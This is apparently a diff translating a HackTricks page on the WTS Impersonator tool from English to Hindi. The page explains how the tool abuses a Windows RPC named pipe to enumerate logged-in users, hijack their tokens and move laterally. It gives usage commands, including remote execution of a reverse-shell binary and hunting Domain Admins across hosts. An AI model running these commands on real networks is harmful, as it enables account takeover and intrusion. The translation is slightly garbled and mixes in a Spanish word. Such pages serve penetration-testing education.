@@ -1,51 +1,48 @@
 {{#include ../../banners/hacktricks-training.md}}
 
-The **WTS Impersonator** tool exploits the **"\\pipe\LSM_API_service"** RPC Named pipe to stealthily enumerate logged-in users and hijack their tokens, bypassing traditional Token Impersonation techniques. This approach facilitates seamless lateral movements within networks. The innovation behind this technique is credited to **Omri Baso, whose work is accessible on [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.
+**WTS Impersonator** उपकरण **"\\pipe\LSM_API_service"** RPC नामित पाइप का उपयोग करके चुपचाप लॉग इन उपयोगकर्ताओं की गणना करता है और उनके टोकन को हाईजैक करता है, पारंपरिक टोकन अनुकरण तकनीकों को बायपास करता है। यह दृष्टिकोण नेटवर्क के भीतर निर्बाध पार्श्व आंदोलनों को सुविधाजनक बनाता है। इस तकनीक के पीछे की नवाचार **Omri Baso** को श्रेय दिया जाता है, cuyo काम [GitHub](https://github.com/OmriBaso/WTSImpersonator) पर उपलब्ध है।
 
-### Core Functionality
+### मुख्य कार्यक्षमता
 
-The tool operates through a sequence of API calls:
-
+उपकरण API कॉल की एक श्रृंखला के माध्यम से कार्य करता है:
 ```powershell
 WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
 ```
-
 ### Key Modules and Usage
 
-- **Enumerating Users**: Local and remote user enumeration is possible with the tool, using commands for either scenario:
+- **उपयोगकर्ताओं की गणना**: इस उपकरण के साथ स्थानीय और दूरस्थ उपयोगकर्ता गणना संभव है, किसी भी परिदृश्य के लिए आदेशों का उपयोग करते हुए:
 
-  - Locally:
-    ```powershell
-    .\WTSImpersonator.exe -m enum
-    ```
-  - Remotely, by specifying an IP address or hostname:
-    ```powershell
-    .\WTSImpersonator.exe -m enum -s 192.168.40.131
-    ```
+- स्थानीय रूप से:
+```powershell
+.\WTSImpersonator.exe -m enum
+```
+- दूरस्थ रूप से, एक IP पता या होस्टनाम निर्दिष्ट करके:
+```powershell
+.\WTSImpersonator.exe -m enum -s 192.168.40.131
+```
 
-- **Executing Commands**: The `exec` and `exec-remote` modules require a **Service** context to function. Local execution simply needs the WTSImpersonator executable and a command:
+- **आदेश निष्पादित करना**: `exec` और `exec-remote` मॉड्यूल को कार्य करने के लिए एक **Service** संदर्भ की आवश्यकता होती है। स्थानीय निष्पादन के लिए केवल WTSImpersonator निष्पादन योग्य और एक आदेश की आवश्यकता होती है:
 
-  - Example for local command execution:
-    ```powershell
-    .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
-    ```
-  - PsExec64.exe can be used to gain a service context:
-    ```powershell
-    .\PsExec64.exe -accepteula -s cmd.exe
-    ```
+- स्थानीय आदेश निष्पादन का उदाहरण:
+```powershell
+.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
+```
+- PsExec64.exe का उपयोग सेवा संदर्भ प्राप्त करने के लिए किया जा सकता है:
+```powershell
+.\PsExec64.exe -accepteula -s cmd.exe
+```
 
-- **Remote Command Execution**: Involves creating and installing a service remotely similar to PsExec.exe, allowing execution with appropriate permissions.
+- **दूरस्थ आदेश निष्पादन**: PsExec.exe के समान दूरस्थ रूप से एक सेवा बनाने और स्थापित करने में शामिल है, जो उचित अनुमतियों के साथ निष्पादन की अनुमति देता है।
 
-  - Example of remote execution:
-    ```powershell
-    .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
-    ```
+- दूरस्थ निष्पादन का उदाहरण:
+```powershell
+.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
+```
 
-- **User Hunting Module**: Targets specific users across multiple machines, executing code under their credentials. This is especially useful for targeting Domain Admins with local admin rights on several systems.
-  - Usage example:
-    ```powershell
-    .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
-    ```
+- **उपयोगकर्ता शिकार मॉड्यूल**: कई मशीनों में विशिष्ट उपयोगकर्ताओं को लक्षित करता है, उनके क्रेडेंशियल के तहत कोड निष्पादित करता है। यह विशेष रूप से कई सिस्टम पर स्थानीय प्रशासनिक अधिकारों के साथ डोमेन प्रशासकों को लक्षित करने के लिए उपयोगी है।
+- उपयोग का उदाहरण:
+```powershell
+.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
+```
 
 {{#include ../../banners/hacktricks-training.md}}
-
